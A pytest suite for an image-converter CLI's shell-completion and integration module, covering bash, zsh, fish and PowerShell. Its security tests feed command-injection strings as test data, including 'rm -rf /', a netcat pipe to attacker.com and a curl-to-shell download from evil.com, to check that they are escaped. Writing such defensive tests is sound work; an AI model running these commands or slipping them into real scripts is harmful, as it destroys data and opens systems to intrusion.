"""
from typing import Any
Comprehensive tests for platform-specific shell integration
Tests bash, zsh, fish, and PowerShell completion and integration
"""

import os
import platform
import shutil
import subprocess
from pathlib import Path
from unittest.mock import MagicMock, mock_open, patch

import pytest

from app.cli.productivity.shell_integration import (
    CompletionScript,
    FunctionLibrary,
    ShellDetector,
    ShellHelper,
    ShellIntegrator,
    ShellType,
)


class TestShellDetector:
    """Test shell detection functionality"""

    @pytest.fixture
    def detector(self) -> None:
        return ShellDetector()

    def test_detect_from_environment(self, detector) -> None:
        """Test detecting shell from environment variables"""
        # Test with SHELL variable
        with patch.dict(os.environ, {"SHELL": "/bin/bash"}):
            assert detector.detect() == ShellType.BASH

        with patch.dict(os.environ, {"SHELL": "/usr/bin/zsh"}):
            assert detector.detect() == ShellType.ZSH

        with patch.dict(os.environ, {"SHELL": "/usr/local/bin/fish"}):
            assert detector.detect() == ShellType.FISH

    def test_detect_from_parent_process(self, detector) -> None:
        """Test detecting shell from parent process"""
        with patch("psutil.Process") as mock_process:
            # Mock parent process
            parent = MagicMock()
            parent.name.return_value = "zsh"
            mock_process.return_value.parent.return_value = parent

            assert detector.detect_from_parent() == ShellType.ZSH

    def test_detect_on_windows(self, detector) -> None:
        """Test shell detection on Windows"""
        with patch("platform.system", return_value="Windows"):
            with patch.dict(os.environ, {"COMSPEC": "C:\\Windows\\System32\\cmd.exe"}):
                assert detector.detect() == ShellType.CMD

            with patch.dict(
                os.environ, {"PSModulePath": "C:\\Program Files\\PowerShell"}
            ):
                assert detector.detect_powershell() == ShellType.POWERSHELL

    def test_detect_fallback(self, detector) -> None:
        """Test fallback when shell cannot be detected"""
        with patch.dict(os.environ, {}, clear=True):
            with patch("platform.system", return_value="Linux"):
                # Should fallback to bash on Unix-like systems
                assert detector.detect() == ShellType.BASH

            with patch("platform.system", return_value="Windows"):
                # Should fallback to cmd on Windows
                assert detector.detect() == ShellType.CMD

    def test_is_available(self, detector) -> None:
        """Test checking if shell is available"""
        with patch("shutil.which") as mock_which:
            mock_which.return_value = "/bin/bash"
            assert detector.is_available(ShellType.BASH) is True

            mock_which.return_value = None
            assert detector.is_available(ShellType.FISH) is False


class TestCompletionScript:
    """Test completion script generation"""

    @pytest.fixture
    def generator(self) -> None:
        return CompletionScript()

    def test_generate_bash_completion(self, generator) -> None:
        """Test Bash completion script generation"""
        script = generator.generate(ShellType.BASH, "img")

        # Check for Bash-specific syntax
        assert "_img_completion()" in script or "complete -F" in script
        assert "COMPREPLY" in script
        assert "complete" in script
        assert "img" in script

    def test_generate_zsh_completion(self, generator) -> None:
        """Test Zsh completion script generation"""
        script = generator.generate(ShellType.ZSH, "img")

        # Check for Zsh-specific syntax
        assert "#compdef img" in script or "_img" in script
        assert "compadd" in script or "_arguments" in script
        assert "completion" in script.lower()

    def test_generate_fish_completion(self, generator) -> None:
        """Test Fish completion script generation"""
        script = generator.generate(ShellType.FISH, "img")

        # Check for Fish-specific syntax
        assert "complete -c img" in script
        assert "--description" in script or "-d" in script
        assert "function" in script or "complete" in script

    def test_generate_powershell_completion(self, generator) -> None:
        """Test PowerShell completion script generation"""
        script = generator.generate(ShellType.POWERSHELL, "img")

        # Check for PowerShell-specific syntax
        assert "Register-ArgumentCompleter" in script
        assert "param(" in script
        assert "[CompletionResult]" in script or "CompletionResult" in script
        assert "img" in script

    def test_command_suggestions(self, generator) -> None:
        """Test command suggestion generation"""
        commands = ["convert", "batch", "optimize", "watch", "profile"]

        # Bash suggestions
        bash_script = generator.generate_with_commands(ShellType.BASH, "img", commands)
        for cmd in commands:
            assert cmd in bash_script

    def test_option_completion(self, generator) -> None:
        """Test option/flag completion"""
        options = ["--format", "--quality", "--output", "--dry-run", "--verbose"]

        script = generator.generate_with_options(ShellType.ZSH, "img", options)

        for opt in options:
            assert opt in script

    def test_dynamic_completion(self, generator) -> None:
        """Test dynamic completion for file patterns"""
        # Test file extension completion
        script = generator.generate_file_completion(
            ShellType.BASH, extensions=["jpg", "png", "webp", "avif"]
        )

        assert "*.jpg" in script or ".jpg" in script
        assert "*.png" in script or ".png" in script

    def test_context_aware_completion(self, generator) -> None:
        """Test context-aware completions"""
        # Generate completion that changes based on previous args
        script = generator.generate_contextual(
            ShellType.ZSH,
            contexts={
                "convert": ["--format", "--quality", "--preset"],
                "batch": ["--workers", "--output-dir", "--recursive"],
                "profile": ["list", "create", "switch", "delete"],
            },
        )

        assert "convert" in script
        assert "--format" in script
        assert "profile" in script


class TestShellHelper:
    """Test shell helper functions"""

    @pytest.fixture
    def helper(self) -> None:
        return ShellHelper()

    def test_generate_alias_functions(self, helper) -> None:
        """Test alias function generation"""
        aliases = {"ic": "img convert", "ib": "img batch", "iw": "img watch"}

        # Bash aliases
        bash_aliases = helper.generate_aliases(ShellType.BASH, aliases)
        assert "alias ic=" in bash_aliases
        assert "alias ib=" in bash_aliases

        # Fish aliases (uses functions)
        fish_aliases = helper.generate_aliases(ShellType.FISH, aliases)
        assert "function ic" in fish_aliases
        assert "img convert $argv" in fish_aliases

    def test_generate_helper_functions(self, helper) -> None:
        """Test helper function generation"""
        # Batch conversion helper
        batch_helper = helper.generate_function(
            ShellType.BASH,
            "img_batch_webp",
            'find . -name "*.jpg" -o -name "*.png" | xargs -I {} img convert {} -f webp',
        )

        assert (
            "img_batch_webp()" in batch_helper
            or "function img_batch_webp" in batch_helper
        )
        assert "img convert" in batch_helper

    def test_path_setup(self, helper) -> None:
        """Test PATH setup for shell"""
        install_dir = "/usr/local/bin"

        # Bash PATH export
        bash_path = helper.setup_path(ShellType.BASH, install_dir)
        assert "export PATH=" in bash_path
        assert install_dir in bash_path

        # Fish PATH setup
        fish_path = helper.setup_path(ShellType.FISH, install_dir)
        assert "set -gx PATH" in fish_path or "set PATH" in fish_path
        assert install_dir in fish_path

    def test_initialization_script(self, helper) -> None:
        """Test shell initialization script"""
        init_script = helper.generate_init_script(
            ShellType.ZSH, program="img", config_dir="~/.image-converter"
        )

        # Should setup completion
        assert "completion" in init_script.lower() or "compinit" in init_script
        # Should export config
        assert "export" in init_script or "setenv" in init_script
        assert "IMAGE_CONVERTER" in init_script


class TestFunctionLibrary:
    """Test shell function library"""

    @pytest.fixture
    def library(self) -> None:
        return FunctionLibrary()

    def test_conversion_functions(self, library) -> None:
        """Test conversion helper functions"""
        functions = library.get_conversion_functions(ShellType.BASH)

        # Should have common conversion helpers
        assert "img_to_webp" in functions
        assert "img_to_avif" in functions
        assert "img_optimize" in functions

        # Check function implementation
        webp_func = functions["img_to_webp"]
        assert "img convert" in webp_func
        assert "-f webp" in webp_func or "--format webp" in webp_func

    def test_batch_functions(self, library) -> None:
        """Test batch processing functions"""
        functions = library.get_batch_functions(ShellType.ZSH)

        assert "img_batch_convert" in functions
        assert "img_watch_dir" in functions

        # Check implementation
        batch_func = functions["img_batch_convert"]
        assert "img batch" in batch_func

    def test_utility_functions(self, library) -> None:
        """Test utility functions"""
        functions = library.get_utility_functions(ShellType.FISH)

        assert "img_stats" in functions
        assert "img_check_format" in functions
        assert "img_compare_sizes" in functions

    def test_profile_functions(self, library) -> None:
        """Test profile management functions"""
        functions = library.get_profile_functions(ShellType.BASH)

        assert "img_use_profile" in functions
        assert "img_list_profiles" in functions
        assert "img_create_profile" in functions


class TestShellIntegrator:
    """Test ShellIntegrator main class"""

    @pytest.fixture
    def integrator(self) -> None:
        return ShellIntegrator()

    @pytest.fixture
    def temp_home(self, tmp_path) -> None:
        """Create temporary home directory structure"""
        home = tmp_path / "home"
        home.mkdir()

        # Create shell config files
        (home / ".bashrc").touch()
        (home / ".zshrc").touch()
        (home / ".config").mkdir()
        (home / ".config" / "fish").mkdir()
        (home / ".config" / "fish" / "config.fish").touch()

        return home

    def test_install_bash_completion(self, integrator, temp_home) -> None:
        """Test installing Bash completion"""
        with patch.dict(os.environ, {"HOME": str(temp_home)}):
            success = integrator.install(ShellType.BASH, program="img", force=False)

            assert success is True

            # Check files were created
            comp_dir = temp_home / ".bash_completion.d"
            assert comp_dir.exists()
            assert (comp_dir / "img").exists()

            # Check rc file was updated
            bashrc = temp_home / ".bashrc"
            content = bashrc.read_text()
            assert "img" in content or "completion" in content

    def test_install_zsh_completion(self, integrator, temp_home) -> None:
        """Test installing Zsh completion"""
        with patch.dict(os.environ, {"HOME": str(temp_home)}):
            # Create Zsh completion directory
            comp_dir = temp_home / ".zsh" / "completions"
            comp_dir.mkdir(parents=True)

            success = integrator.install(ShellType.ZSH, program="img")

            assert success is True

            # Check completion file
            assert (comp_dir / "_img").exists() or (
                temp_home / ".zsh" / "functions" / "_img"
            ).exists()

    def test_install_fish_completion(self, integrator, temp_home) -> None:
        """Test installing Fish completion"""
        with patch.dict(os.environ, {"HOME": str(temp_home)}):
            fish_dir = temp_home / ".config" / "fish"
            comp_dir = fish_dir / "completions"
            comp_dir.mkdir(parents=True)

            success = integrator.install(ShellType.FISH, program="img")

            assert success is True
            assert (comp_dir / "img.fish").exists()

    def test_install_powershell_completion(self, integrator, temp_home) -> None:
        """Test installing PowerShell completion"""
        with patch.dict(os.environ, {"HOME": str(temp_home)}):
            with patch("platform.system", return_value="Windows"):
                ps_dir = temp_home / "Documents" / "PowerShell"
                ps_dir.mkdir(parents=True)

                success = integrator.install(ShellType.POWERSHELL, program="img")

                # Check profile was updated
                profile = ps_dir / "Microsoft.PowerShell_profile.ps1"
                if profile.exists():
                    content = profile.read_text()
                    assert "img" in content or "ArgumentCompleter" in content

    def test_install_with_existing(self, integrator, temp_home) -> None:
        """Test installing with existing completion"""
        with patch.dict(os.environ, {"HOME": str(temp_home)}):
            # Install once
            integrator.install(ShellType.BASH, "img")

            # Install again without force - should skip
            with patch("builtins.print") as mock_print:
                success = integrator.install(ShellType.BASH, "img", force=False)

                # Should indicate already installed
                calls = [str(c) for c in mock_print.call_args_list]
                assert any("already" in str(c).lower() for c in calls)

    def test_uninstall_completion(self, integrator, temp_home) -> None:
        """Test uninstalling completion"""
        with patch.dict(os.environ, {"HOME": str(temp_home)}):
            # Install first
            integrator.install(ShellType.BASH, "img")

            # Uninstall
            success = integrator.uninstall(ShellType.BASH, "img")
            assert success is True

            # Check files were removed
            comp_dir = temp_home / ".bash_completion.d"
            assert not (comp_dir / "img").exists()

    def test_auto_detect_and_install(self, integrator, temp_home) -> None:
        """Test auto-detection and installation"""
        with patch.dict(os.environ, {"HOME": str(temp_home), "SHELL": "/bin/bash"}):
            success = integrator.auto_install("img")
            assert success is True

            # Should have installed for detected shell
            comp_dir = temp_home / ".bash_completion.d"
            assert comp_dir.exists()

    def test_install_all_available(self, integrator, temp_home) -> None:
        """Test installing for all available shells"""
        with patch.dict(os.environ, {"HOME": str(temp_home)}):
            with patch("shutil.which") as mock_which:
                # Mock all shells as available
                mock_which.return_value = "/usr/bin/shell"

                results = integrator.install_all_available("img")

                # Should attempt installation for multiple shells
                assert len(results) > 0
                assert any(r["success"] for r in results)

    def test_verify_installation(self, integrator, temp_home) -> None:
        """Test verifying installation"""
        with patch.dict(os.environ, {"HOME": str(temp_home)}):
            # Not installed yet
            assert integrator.verify_installation(ShellType.BASH, "img") is False

            # Install
            integrator.install(ShellType.BASH, "img")

            # Now should be installed
            assert integrator.verify_installation(ShellType.BASH, "img") is True


class TestPlatformSpecific:
    """Platform-specific integration tests"""

    @pytest.fixture
    def integrator(self) -> None:
        return ShellIntegrator()

    @pytest.mark.skipif(platform.system() != "Linux", reason="Linux-specific test")
    def test_linux_integration(self, integrator, tmp_path) -> None:
        """Test Linux-specific shell integration"""
        with patch.dict(os.environ, {"HOME": str(tmp_path)}):
            # Test common Linux shells
            for shell in [ShellType.BASH, ShellType.ZSH]:
                if shutil.which(shell.value):
                    success = integrator.install(shell, "img")
                    assert success is True

    @pytest.mark.skipif(platform.system() != "Darwin", reason="macOS-specific test")
    def test_macos_integration(self, integrator, tmp_path) -> None:
        """Test macOS-specific shell integration"""
        with patch.dict(os.environ, {"HOME": str(tmp_path)}):
            # macOS defaults to zsh since Catalina
            if shutil.which("zsh"):
                success = integrator.install(ShellType.ZSH, "img")
                assert success is True

            # Check Homebrew completions directory
            brew_comp = Path("/usr/local/share/zsh/site-functions")
            if brew_comp.exists():
                # Test Homebrew integration
                pass

    @pytest.mark.skipif(platform.system() != "Windows", reason="Windows-specific test")
    def test_windows_integration(self, integrator, tmp_path) -> None:
        """Test Windows-specific shell integration"""
        with patch.dict(os.environ, {"USERPROFILE": str(tmp_path)}):
            # Test PowerShell
            ps_dir = tmp_path / "Documents" / "PowerShell"
            ps_dir.mkdir(parents=True)

            success = integrator.install(ShellType.POWERSHELL, "img")

            # Check PowerShell profile
            profile = ps_dir / "Microsoft.PowerShell_profile.ps1"
            if profile.exists():
                content = profile.read_text()
                assert "Register-ArgumentCompleter" in content

    def test_wsl_integration(self, integrator, tmp_path) -> None:
        """Test WSL (Windows Subsystem for Linux) integration"""
        with patch.dict(
            os.environ, {"HOME": str(tmp_path), "WSL_DISTRO_NAME": "Ubuntu"}
        ):
            # In WSL, should support Linux shells
            success = integrator.install(ShellType.BASH, "img")
            assert success is True

    def test_termux_integration(self, integrator, tmp_path) -> None:
        """Test Termux (Android) integration"""
        with patch.dict(
            os.environ,
            {"HOME": str(tmp_path), "PREFIX": "/data/data/com.termux/files/usr"},
        ):
            # Termux uses different paths
            success = integrator.install(
                ShellType.BASH,
                "img",
                custom_dir="/data/data/com.termux/files/usr/share/bash-completion/completions",
            )
            # Would succeed if paths exist


class TestShellIntegrationSecurity:
    """Security tests for shell integration"""

    @pytest.fixture
    def integrator(self) -> None:
        return ShellIntegrator()

    def test_no_code_injection(self, integrator) -> None:
        """Test prevention of code injection in completion scripts"""
        # Try injecting malicious code
        malicious_inputs = [
            "img'; rm -rf /; echo '",
            "img$(evil_command)",
            "img`backdoor`",
            "img | nc attacker.com 1234",
            "img && curl evil.com/malware.sh | sh",
        ]

        generator = CompletionScript()

        for evil in malicious_inputs:
            script = generator.generate(ShellType.BASH, evil)

            # Should escape or reject dangerous input
            assert "rm -rf" not in script
            assert "nc attacker" not in script
            assert "curl evil" not in script
            assert "$(evil_command)" not in script

    def test_safe_path_handling(self, integrator, tmp_path) -> None:
        """Test safe handling of paths with special characters"""
        # Create paths with special characters
        special_paths = [
            tmp_path / "path with spaces",
            tmp_path / "path'with'quotes",
            tmp_path / 'path"with"doublequotes',
            tmp_path / "path;with;semicolons",
            tmp_path / "path|with|pipes",
        ]

        for path in special_paths:
            path.mkdir(parents=True, exist_ok=True)

            # Should handle safely
            with patch.dict(os.environ, {"HOME": str(path)}):
                try:
                    integrator.install(ShellType.BASH, "img")
                    # Should not raise exception
                    assert True
                except Exception as e:
                    pytest.fail(f"Failed to handle special path: {e}")

    def test_permission_checks(self, integrator, tmp_path) -> None:
        """Test permission checking before file operations"""
        restricted_dir = tmp_path / "restricted"
        restricted_dir.mkdir()

        # Make directory read-only
        os.chmod(restricted_dir, 0o444)

        try:
            with patch.dict(os.environ, {"HOME": str(restricted_dir)}):
                success = integrator.install(ShellType.BASH, "img")
                # Should handle gracefully
                assert success is False or success is None
        finally:
            # Restore permissions for cleanup
            os.chmod(restricted_dir, 0o755)

    def test_no_arbitrary_file_write(self, integrator) -> None:
        """Test prevention of arbitrary file writes"""
        # Try to write to system locations
        dangerous_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/root/.bashrc",
            "~/../../../etc/hosts",
        ]

        for path in dangerous_paths:
            with patch("builtins.open", mock_open()) as mock_file:
                try:
                    integrator.install(ShellType.BASH, "img", custom_dir=path)
                except (PermissionError, ValueError):
                    # Should reject or fail safely
                    pass

                # Should not write to dangerous locations
                for call in mock_file.call_args_list:
                    assert "/etc/" not in str(call)
                    assert "/root/" not in str(call)


class TestShellIntegrationE2E:
    """End-to-end shell integration tests"""

    @pytest.fixture
    def full_setup(self, tmp_path) -> None:
        """Full integration setup"""
        # Create mock CLI structure
        cli_dir = tmp_path / "cli"
        cli_dir.mkdir()

        # Create mock executable
        img_exe = cli_dir / "img"
        img_exe.write_text("#!/bin/bash\necho 'Image Converter CLI'")
        img_exe.chmod(0o755)

        # Setup environment
        env = {
            "HOME": str(tmp_path / "home"),
            "PATH": f"{cli_dir}:{os.environ.get('PATH', '')}",
        }

        (tmp_path / "home").mkdir()

        return cli_dir, env

    def test_complete_installation_workflow(self, full_setup) -> None:
        """Test complete installation workflow"""
        cli_dir, env = full_setup

        with patch.dict(os.environ, env):
            integrator = ShellIntegrator()

            # 1. Detect shell
            detector = ShellDetector()
            shell = detector.detect()

            # 2. Install completion
            success = integrator.install(shell, "img")
            assert success is True

            # 3. Verify installation
            assert integrator.verify_installation(shell, "img") is True

            # 4. Install helper functions
            library = FunctionLibrary()
            functions = library.get_all_functions(shell)
            assert len(functions) > 0

    @pytest.mark.skipif(not shutil.which("bash"), reason="Bash not available")
    def test_bash_completion_interactive(self, full_setup) -> None:
        """Test Bash completion interactively"""
        cli_dir, env = full_setup

        # Create completion script
        comp_script = cli_dir / "img_completion.bash"
        comp_script.write_text(
            """
_img_completion() {
    local cur="${COMP_WORDS[COMP_CWORD]}"
    local commands="convert batch optimize watch profile"
    COMPREPLY=($(compgen -W "${commands}" -- "${cur}"))
}
complete -F _img_completion img
        """
        )

        # Test completion
        test_script = f"""
source {comp_script}
# Simulate completion
COMP_WORDS=(img c)
COMP_CWORD=1
_img_completion
echo "${{COMPREPLY[@]}}"
        """

        result = subprocess.run(
            ["bash", "-c", test_script],
            capture_output=True,
            text=True,
            env={**os.environ, **env},
        )

        # Should suggest 'convert'
        assert "convert" in result.stdout

    def test_multi_shell_compatibility(self, full_setup) -> None:
        """Test compatibility across multiple shells"""
        cli_dir, env = full_setup

        integrator = ShellIntegrator()
        results = {}

        # Test each available shell
        for shell in [ShellType.BASH, ShellType.ZSH, ShellType.FISH]:
            if shutil.which(shell.value):
                with patch.dict(os.environ, env):
                    success = integrator.install(shell, "img")
                    results[shell] = success

        # At least one should succeed
        assert any(results.values())

    def test_upgrade_scenario(self, full_setup) -> None:
        """Test upgrading existing installation"""
        cli_dir, env = full_setup

        with patch.dict(os.environ, env):
            integrator = ShellIntegrator()

            # Install version 1
            integrator.install(ShellType.BASH, "img")

            # Modify to simulate old version
            comp_dir = Path(env["HOME"]) / ".bash_completion.d"
            old_file = comp_dir / "img"
            if old_file.exists():
                old_file.write_text("# Old version 1.0")

            # Upgrade to version 2
            success = integrator.install(ShellType.BASH, "img", force=True)
            assert success is True

            # Check new version installed
            if old_file.exists():
                content = old_file.read_text()
                assert "# Old version 1.0" not in content
